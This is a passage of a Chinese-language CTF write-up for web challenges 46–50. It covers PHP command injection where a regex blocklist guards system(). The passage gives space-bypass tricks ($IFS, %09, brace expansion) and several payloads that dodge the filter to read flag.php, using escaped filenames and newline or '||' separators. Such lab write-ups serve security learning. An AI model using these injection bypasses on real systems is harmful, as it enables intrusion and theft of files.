<h4 id="知识点：空格绕过"><a href="#知识点：空格绕过" class="headerlink" title="知识点：空格绕过"></a>知识点：空格绕过</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;&lt;    &lt;&gt; 重定向符</span><br><span class="line">%<span class="number">09</span>(需要php环境)</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line"><span class="variable">$IFS</span></span><br><span class="line">$IFS$<span class="number">1</span></span><br><span class="line">$IFS$<span class="number">9</span></span><br><span class="line">&#123;cat,flag.php&#125; <span class="comment">//用逗号实现了空格功能</span></span><br><span class="line">%<span class="number">20</span></span><br></pre></td></tr></table></figure>
<h2 id="web46、47、48"><a href="#web46、47、48" class="headerlink" title="web46、47、48"></a>web46、47、48</h2><h3 id="题目：-5"><a href="#题目：-5" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-5"><a href="#解答：-5" class="headerlink" title="解答："></a>解答：</h3><p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;tac%09????.???||    &#x2F;&#x2F;复习前面的通配符;备注：%09会解析成空格，不会被正则ban</span><br></pre></td></tr></table></figure>
<h2 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h2><h3 id="题目：-6"><a href="#题目：-6" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-6"><a href="#解答：-6" class="headerlink" title="解答："></a>解答：</h3><p>用之前的payload也行，贴一下大佬的一排payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload1:c&#x3D;nl%09fla\g.php||</span><br><span class="line">payload2:c&#x3D;nl%09fla\g.php%0a</span><br><span class="line">payload3:c&#x3D;nl%09fla&#39;&#39;g.php%0a</span><br><span class="line">payload4:c&#x3D;nl%09fla&quot;&quot;g.php%0a</span><br><span class="line">payload5:c&#x3D;vi%09fla\g.php%0a</span><br><span class="line">payload6:c&#x3D;tac%09fla\g.php%0a</span><br><span class="line">payload7:c&#x3D;uniq%09fla\g.php%0a</span><br><span class="line">payload8:c&#x3D;nl&lt;fla&#39;&#39;g.php||</span><br><span class="line">payload9:c&#x3D;nl%09fla\g.php%26</span><br></pre></td></tr></table></figure>
<h2 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h2><h3 id="题目：-7"><a href="#题目：-7" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-7"><a href="#解答：-7" class="headerlink" title="解答："></a>解答：</h3><p>paylaod1:<code>?c=tac&lt;&gt;fla\g.php||</code></p>
<p>payload2:<code>c=nl&lt;fla\g.php||</code></p>
<p>注意点：&lt;&gt;和?一起使用时没有回显,所以这里的？可以用反斜杠进行代替</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>命令执行</tag>
      </tags>
  </entry>
</search>
